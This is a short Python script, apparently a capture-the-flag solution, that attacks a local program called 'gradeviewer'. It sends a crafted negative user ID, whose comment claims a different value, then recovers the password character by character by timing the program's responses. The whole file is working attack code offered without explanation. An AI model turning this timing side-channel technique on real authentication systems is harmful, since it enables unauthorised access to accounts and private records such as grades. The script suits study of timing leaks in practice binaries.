import subprocess
import time
import string

CHARS = string.ascii_lowercase + string.digits
KNOWN = ""
BINARY = "./gradeviewer"

def test_input(prefix):
    # Launch the binary
    p = subprocess.Popen([BINARY], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    try:
        # Send ID 3054
        p.stdin.write(b"-62482\n")
        p.stdin.flush()

        # Wait for prompt
        p.stdout.readline()
        p.stdout.readline()

        # Time the password attempt
        start = time.time()
        p.stdin.write((prefix + "\n").encode())
        p.stdin.flush()
        
        # Read until EOF
        output = p.communicate(timeout=2)[0]
        end = time.time()

        return end - start
    except:
        p.kill()
        return 0

while True:
    best_char = ''
    best_time = 0

    for c in CHARS:
        guess = KNOWN + c
        elapsed = test_input(guess)
        print(f"Trying: {guess.ljust(20)} - Time: {elapsed:.5f}s")
        if elapsed > best_time:
            best_time = elapsed
            best_char = c

    KNOWN += best_char
    print(f"[+] So far: {KNOWN}")
